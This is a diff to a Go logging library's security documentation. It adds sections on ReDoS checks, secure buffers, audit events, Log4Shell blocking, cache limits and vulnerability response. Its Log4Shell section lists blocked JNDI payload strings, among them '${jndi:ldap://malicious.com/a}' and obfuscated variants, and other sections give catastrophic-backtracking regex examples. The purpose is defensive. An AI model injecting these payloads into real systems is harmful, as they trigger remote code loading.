@@ -189,7 +189,7 @@ filter := dd.NewSensitiveDataFilter()
 result := filter.Filter(potentiallyMaliciousInput)
 ```
 
-If a regex operation exceeds the timeout, it returns `[REDACTED - REGEX TIMEOUT]`.
+If a regex operation exceeds the timeout, it returns `[REDACTED]`.
 
 #### Input Length Limiting
 
@@ -200,11 +200,24 @@ Filters enforce maximum input lengths to prevent catastrophic backtracking:
 
 Inputs exceeding limits are truncated with `... [TRUNCATED FOR SECURITY]` suffix.
 
+#### Pattern Validation
+
+Custom patterns are validated for ReDoS vulnerability:
+```go
+filter := dd.NewEmptySensitiveDataFilter()
+err := filter.AddPattern("(a+)+") // Returns ErrReDoSPattern
+```
+
+Detected dangerous patterns:
+- Nested quantifiers: `(a+)+`, `(a*)*`, `(a+)*`
+- Overlapping alternatives: `(a|a)+`
+- Excessive quantifier ranges: `a{1,1000000}`
+
 #### Panic Recovery
 
 The filter includes panic recovery to handle regex engine crashes:
 ```go
-// If regex panics, returns: [REDACTED - REGEX ERROR: <error>]
+// If regex panics, returns: [REDACTED]
 ```
 
 ### 4. Resource Exhaustion Protection
@@ -238,6 +251,13 @@ logger.InfoWith("Test",
 )
 ```
 
+#### Concurrency Limits
+
+The filter uses a semaphore to limit concurrent regex operations:
+```go
+const maxConcurrentFilters = 100
+```
+
 ### 5. Path Traversal Protection
 
 File writers automatically validate paths to prevent directory traversal attacks:
@@ -267,7 +287,40 @@ The library detects UTF-8 overlong encoding attacks, which can be used to bypass
 // - 0xE0 0x80 0xAF represents '/' (3-byte overlong)
 ```
 
-### 6. Thread Safety
+### 6. Secure Memory Handling
+
+DD implements secure memory handling to prevent sensitive data from remaining in memory:
+
+#### SecureBuffer
+
+A byte buffer that zeros its contents when released:
+```go
+buf := internal.NewSecureBuffer()
+buf.WriteString("sensitive data")
+// ... use buffer ...
+buf.Release() // Zeros contents before returning to pool
+```
+
+#### SecureString
+
+A string wrapper with constant-time comparison:
+```go
+ss := internal.NewSecureString("secret")
+if ss.Equals(userInput) {
+    // Constant-time comparison prevents timing attacks
+}
+ss.Clear() // Zeros and releases the data
+```
+
+#### Pool Buffer Zeroing
+
+All pooled buffers are zeroed before being returned to the pool:
+- JSON encoding buffers
+- Text formatting buffers
+- Field formatting buffers
+- Sanitization buffers
+
+### 7. Thread Safety
 
 All public methods are fully concurrent-safe:
 - Atomic operations for hot paths (level checks, state management)
@@ -287,6 +340,88 @@ for i := 0; i < 100; i++ {
 }
 wg.Wait()
 ```
+
+#### Atomic Cache Operations
+
+Caches use atomic operations to ensure consistency:
+- `sync.Map` for caller and depth caches
+- `atomic.Pointer` for time cache
+- CAS (Compare-And-Swap) loops for atomic updates
+
+### 8. Audit Logging
+
+DD provides comprehensive audit logging for security monitoring:
+
+#### Audit Event Types
+
+| Event Type | Description | Severity |
+|------------|-------------|----------|
+| `SENSITIVE_DATA_REDACTED` | Sensitive data was filtered | Info |
+| `RATE_LIMIT_EXCEEDED` | Rate limit triggered | Warning |
+| `REDOS_ATTEMPT` | Potential ReDoS pattern detected | Error |
+| `SECURITY_VIOLATION` | General security violation | Error |
+| `INTEGRITY_VIOLATION` | Log integrity check failed | Critical |
+| `INPUT_SANITIZED` | Input was sanitized | Info |
+| `PATH_TRAVERSAL_ATTEMPT` | Path traversal detected | Error |
+| `LOG4SHELL_ATTEMPT` | Log4Shell pattern detected | Critical |
+| `NULL_BYTE_INJECTION` | Null byte injection detected | Warning |
+| `OVERLONG_ENCODING` | UTF-8 overlong encoding detected | Warning |
+| `HOMOGRAPH_ATTACK` | Homograph attack detected | Warning |
+
+#### Usage
+
+```go
+// Create audit logger
+auditConfig := dd.DefaultAuditConfig()
+auditConfig.Output = auditFile
+auditConfig.JSONFormat = true
+auditLogger := dd.NewAuditLogger(auditConfig)
+
+// Attach to main logger
+config := dd.DefaultConfig()
+config.AuditLogger = auditLogger
+logger, _ := dd.New(config)
+```
+
+### 9. Log4Shell Protection
+
+DD detects and blocks Log4Shell (CVE-2021-44228) attack patterns:
+
+```go
+// These patterns are blocked:
+// - ${jndi:ldap://malicious.com/a}
+// - ${${lower:j}ndi:ldap://...}
+// - ${${::-j}${::-n}${::-d}${::-i}:...}
+// - Unicode escapes: \u006a\u006e\u0064\u0069
+```
+
+### 10. Cache Security
+
+#### Cache Size Limits
+
+All caches have size limits to prevent memory exhaustion:
+- Caller cache: 10,000 entries max
+- Depth cache: 5,000 entries max
+- Filter result cache: 1,000 entries max
+
+#### Cache TTL
+
+Filter results have a 5-minute TTL with 1ms safety margin:
+```go
+const cacheTTLSeconds = 300
+ttlWithMargin := time.Duration(cacheTTLSeconds)*time.Second - time.Millisecond
+```
+
+#### Hash Collision Protection
+
+Filter cache uses both hash and input verification:
+```go
+if entry, ok := f.cache[inputHash]; ok && len(entry.input) == inputLen && entry.input == input {
+    // Use cached result
+}
+```
+
+---
 
 ## Security Best Practices
 
@@ -363,7 +498,7 @@ When logging to files, ensure appropriate file permissions:
 ```go
 // Set restrictive permissions on log files
 fileWriter, _ := dd.NewFileWriter("logs/app.log", dd.FileWriterConfig{
-    // File is created with 0644 permissions by default
+    // File is created with 0600 permissions by default
     // Adjust OS-level permissions as needed
 })
 ```
@@ -457,6 +592,8 @@ if recorder.HasErrors() {
 }
 ```
 
+---
+
 ## Security Configuration Reference
 
 ### Minimal Security Configuration
@@ -504,6 +641,8 @@ config.SecurityConfig = &dd.SecurityConfig{
 }
 ```
 
+---
+
 ## Performance vs Security Trade-offs
 
 | Feature               | Performance Impact | Security Benefit | Recommendation             |
@@ -515,6 +654,41 @@ config.SecurityConfig = &dd.SecurityConfig{
 | Message size limiting | Minimal            | High             | Always enable              |
 | Newline escaping      | Minimal            | High             | Always enabled             |
 | Field key validation  | Minimal            | Medium           | Always enabled             |
+
+---
+
+## Internal Security Measures
+
+### Memory Pool Security
+
+All memory pools implement secure handling:
+
+| Pool Type | Security Measure |
+|-----------|-----------------|
+| JSON Encoder Pool | Buffer zeroed before return |
+| Text Builder Pool | Buffer zeroed before return |
+| Field Pool | Buffer zeroed before return |
+| Sanitize Buffer Pool | Buffer zeroed before return |
+| Caller PC Pool | Slice reused, no sensitive data |
+| Map Pools | Clear() called before return |
+
+### Cache Consistency
+
+All caches implement atomic operations:
+- `sync.Map` for concurrent-safe storage
+- `atomic.Int32` for size counters
+- CAS loops for atomic updates
+- Size limits enforced atomically
+
+### Fast Path Security
+
+Performance optimizations maintain security:
+- Depth limits prevent stack overflow (max: 1000)
+- JSON depth limits prevent recursive attacks (max: 100)
+- Time cache uses atomic operations for consistency
+- All buffers zeroed before pool return
+
+---
 
 ## Reporting a Vulnerability
 
@@ -528,6 +702,16 @@ If you discover a security vulnerability in the DD library, please report it res
    - Potential impact
    - Suggested fix (if available)
 
+### Response Timeline
+
+| Stage | Timeline |
+|-------|----------|
+| Initial response | Within 48 hours |
+| Vulnerability confirmation | Within 7 days |
+| Fix development | Within 14 days (critical), 30 days (others) |
+| Patch release | Within 24 hours of fix completion |
+
+---
 
 ## Security Checklist
 
@@ -543,11 +727,32 @@ If you discover a security vulnerability in the DD library, please report it res
 - [ ] Consider encryption for logs at rest (external to DD)
 - [ ] Monitor log file sizes and disk usage
 - [ ] Test security configurations in staging environment
+- [ ] Enable audit logging for security monitoring
+- [ ] Configure rate limiting for high-traffic applications
+- [ ] Use HTTPS/TLS for network log transport
+
+---
 
 ## Additional Resources
 
 - [README.md](README.md) - General documentation
-- [examples/04_security_features.go](examples/04_security.go) - Security examples
+- [examples/04_security.go](examples/04_security.go) - Security examples
+- [OWASP Logging Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html)
+
+---
+
+## Changelog
+
+### Security Updates
+
+| Version | Date | Description |
+|---------|------|-------------|
+| Latest | 2026-03-21 | Added buffer zeroing for JSON encoder pool |
+| Latest | 2026-03-21 | Fixed time cache CAS retry consistency |
+| Latest | 2026-03-21 | Fixed depth cache overflow handling |
+| Latest | 2026-03-21 | Fixed filter cache TTL boundary condition |
+| Latest | 2026-03-21 | Fixed map pool cleanup logic |
+| Latest | 2026-03-21 | Added nil map handling in JSON fast path |
 
 ---
 
